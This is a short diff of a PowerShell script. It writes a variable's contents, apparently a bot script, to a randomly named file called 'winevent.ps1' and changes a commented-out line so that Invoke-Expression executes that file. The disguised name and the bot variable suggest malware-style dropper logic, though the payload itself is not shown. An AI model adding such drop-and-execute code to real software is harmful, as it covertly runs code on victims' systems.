@@ -40,4 +40,4 @@ $file = $sbDir + $sbRand + "winevent.ps1"
 $writeSbBot | out-file -Filepath $file
 
 # Executes the PowerShell script
-#Invoke-Expression $file
+Invoke-Expression $file
